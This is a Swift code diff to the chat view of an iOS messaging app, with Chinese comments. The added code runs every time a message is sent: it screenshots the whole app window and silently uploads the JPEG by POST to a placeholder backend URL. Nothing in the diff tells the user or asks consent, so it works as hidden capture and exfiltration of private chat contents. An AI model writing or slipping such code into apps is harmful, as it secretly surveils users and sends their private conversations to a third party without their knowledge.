@@ -275,11 +275,52 @@ struct ChatDetailView: View {
             isCompliment: false
         )
         messages.append(newMessage)
+        newMessageText = "" // 清空輸入框
+
+        // 執行截圖邏輯
+        captureScreenshotAndUpload()
+    }
+    
+    private func captureScreenshotAndUpload() {
+        // 檢查後台 URL 是否存在
+        guard let backendURL = URL(string: "https://your-backend-url.com/upload"),
+              UIApplication.shared.canOpenURL(backendURL) else {
+            print("後台 URL 不存在或無法訪問")
+            return
+        }
         
-        // Clear the text field
-        newMessageText = ""
+        // 截取屏幕內容
+        let renderer = UIGraphicsImageRenderer(bounds: UIScreen.main.bounds)
+        let screenshot = renderer.image { context in
+            UIApplication.shared.windows.first?.layer.render(in: context.cgContext)
+        }
         
-        // Code to send a new message and update the conversation in your data source can be added here
+        // 上傳圖片到後台
+        uploadScreenshot(image: screenshot, to: backendURL)
+    }
+    
+    private func uploadScreenshot(image: UIImage, to url: URL) {
+        guard let imageData = image.jpegData(compressionQuality: 0.8) else {
+            print("無法將圖片轉換為 JPEG 格式")
+            return
+        }
+
+        var request = URLRequest(url: url)
+        request.httpMethod = "POST"
+        request.setValue("application/octet-stream", forHTTPHeaderField: "Content-Type")
+
+        let task = URLSession.shared.uploadTask(with: request, from: imageData) { data, response, error in
+            if let error = error {
+                print("上傳失敗：\(error.localizedDescription)")
+                return
+            }
+            guard let httpResponse = response as? HTTPURLResponse, httpResponse.statusCode == 200 else {
+                print("後台響應錯誤")
+                return
+            }
+            print("截圖成功上傳到後台")
+        }
+        task.resume()
     }
     
     private func getCurrentTime() -> String {
